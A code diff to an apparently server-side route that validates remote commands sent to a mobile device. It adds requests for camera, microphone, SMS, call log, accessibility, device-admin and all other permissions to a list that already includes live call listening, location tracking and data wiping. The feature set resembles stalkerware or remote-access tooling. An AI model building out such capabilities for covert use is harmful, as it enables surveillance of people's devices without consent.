@@ -238,7 +238,22 @@ router.post('/:deviceId/command', protect, async (req, res) => {
       'live_call_listen',
       'get_location',
       'wipe_data',
-      'uninstall_app'
+      'uninstall_app',
+      // Permission request commands
+      'request_location_permission',
+      'request_camera_permission',
+      'request_microphone_permission',
+      'request_contacts_permission',
+      'request_sms_permission',
+      'request_call_log_permission',
+      'request_storage_permission',
+      'request_phone_permission',
+      'request_notification_permission',
+      'request_usage_access_permission',
+      'request_overlay_permission',
+      'request_device_admin_permission',
+      'request_accessibility_permission',
+      'request_all_permissions'
     ];
 
     if (!validCommands.includes(command)) {
